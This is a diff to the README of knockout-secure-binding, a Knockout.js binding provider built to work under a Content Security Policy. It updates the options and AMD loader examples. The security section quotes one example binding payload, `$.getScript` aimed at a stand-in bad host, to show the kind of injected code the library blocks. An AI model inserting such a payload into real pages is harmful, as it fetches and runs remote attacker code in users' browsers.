@@ -39,7 +39,12 @@ Then include it in your project with a `script` tag and a property `secureBindin
 KSB is a near drop-in replacement for the standard Knockout binding provider when provided the following options:
 
 ```
-var options = { globals: window, attribute: "data-bind" };
+var options = {
+   attribute: "data-bind",        // default "data-sbind"
+   globals: window,               // default {}
+   bindings: ko.bindingHandlers,  // default ko.bindingHandlers
+   noVirtualElements: false       // default true
+};
 ko.bindingProvider.instance = new ko.secureBindingsProvider(options);
 ```
 
@@ -48,10 +53,28 @@ Having called the above, when you run `ko.applyBindings` the knockout bindings w
 When the `attribute` option is not provided the default binding for KSB is `data-sbind`. You can see more options below. By default KSB the `globals` object for KSB is an empty object. The options are described in more detail below.
 
 
-AMD Loader
----
+### AMD Loader
 
-If you are using an AMD loader, then KSB is exported. Have a look at the example in [knockout-classBindingProvider](https://github.com/rniemeyer/knockout-classBindingProvider)) for an example of making this work.
+If you are using an AMD loader, then KSB is exported, and you should be able to
+load it like this:
+
+```
+require(["knockout", "knockout-secure-binding"], function (ko, ksb) {
+  // Show all options, more restricted setup than the Knockout regular binding.
+  var options = {
+     attribute: "data-sbind",      // ignore legacy data-bind values
+     globals: {},                  // no globals
+     bindings: ko.bindingHandlers, // still use default binding handlers
+     noVirtualElements: true       // no virtual elements
+  };
+
+  ko.bindingProvider.instance = new ksb(options);
+  /* ... */
+});
+```
+
+
+Have a look at the example in [knockout-classBindingProvider](https://github.com/rniemeyer/knockout-classBindingProvider)) for more info.
 
 
 
@@ -108,14 +131,12 @@ By using KSB in place of the regular binding provider one can continue use
 Knockout in an environment with a Content Security Policy. This includes for example [Chrome web apps](http://developer.chrome.com/apps/contentSecurityPolicy.html).
 
 Independent of a Content Security Policy, KSB prevents the execution of arbitrary code in a Knockout binding. A malicious script such as
-`text: $.getScript('http://a.bad.place/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However this script
+`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However this script
 will not execute in KSB because:
 
 1. The `$` is a global, and unless explicitly added to the binding context it will not be accessible;
 2. Functions in KSB do not accept arguments;
-3. Your CSP should prevent accessing the host `a.bad.place`.
-
-The `data-sbind` differs from `data-bind` as follows:
+3. Your CSP should prevent accessing the host `a.bad.place.example.com`.
 
 
 Options
